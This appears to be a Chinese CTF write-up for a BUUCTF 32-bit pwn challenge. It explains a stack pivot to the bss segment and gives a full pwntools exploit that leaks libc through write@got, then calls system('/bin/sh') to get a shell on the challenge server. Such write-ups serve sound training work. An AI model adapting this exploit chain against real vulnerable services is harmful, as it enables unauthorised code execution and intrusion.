---
title: BUU刷题 [Black Watch 入群题]PWN-栈迁移
description: BUU刷题 [Black Watch 入群题]PWN-栈迁移-writeup
date: 2021-08-07 15:07:56
categories:
 - PWN
tags:
---

# BUU刷题 [Black Watch 入群题]PWN-栈迁移

## IDA分析

![image-20220222141319826](https://gitee.com/gdmzyzl/picgo/raw/master/picbed/image-20220222141319826.png)

主要功能点就在vul_function()里，第一个read，s在bss段里，虽然可以输入0x200，没法溢出；第二个read只能输入0x20字节，只能覆盖ebp和返回地址，这里发现s在bss段里而且可以输入挺多字节，可以考虑栈迁移到bss段里，但是这题没有提供system和/bin/sh，我们还需要构造ROP链泄露libc，栈迁移知识看我另一篇笔记。

## EXP

```python
plt_write = elf.sym['write']
got_write = elf.got['write']
main = elf.sym['main']

payload = 'aaaa' + p32(plt_write) + p32(main) + p32(1) + p32(got_write) + p32(4)
p.sendafter('name?',payload)

payload1 = 'a'*0x18 + p32(bss) + p32(leave_ret)
p.sendafter('say?',payload1)
```

![image-20220222141304741](https://gitee.com/gdmzyzl/picgo/raw/master/picbed/image-20220222141304741.png)

之后就是简单ROP了，完整EXP，掌握了栈迁移就很简单了

```python
from pwn import *
from LibcSearcher import *

context.log_level = 'debug'

# p = process('./spwn')
p = remote('node4.buuoj.cn','26502')
elf = ELF('./spwn')

bss = 0x0804A300
leave_ret = 0x08048511

plt_write = elf.sym['write']
got_write = elf.got['write']
main = elf.sym['main']

payload = 'aaaa' + p32(plt_write) + p32(main) + p32(1) + p32(got_write) + p32(4)
p.sendafter('name?',payload)

payload1 = 'a'*0x18 + p32(bss) + p32(leave_ret)
p.sendafter('say?',payload1)

write_addr = u32(p.recv(4))
print(hex(write_addr))
libc = LibcSearcher('write',write_addr)
libc_base = write_addr - libc.dump('write')
sys_addr = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')

payload = 'aaaa' + p32(sys_addr) + p32(0xdeadbeef) + p32(bin_sh)
p.sendafter('name?',payload)

payload = 'a'*0x18 + p32(bss) + p32(leave_ret)
p.sendafter('say?',payload1)

p.interactive()
```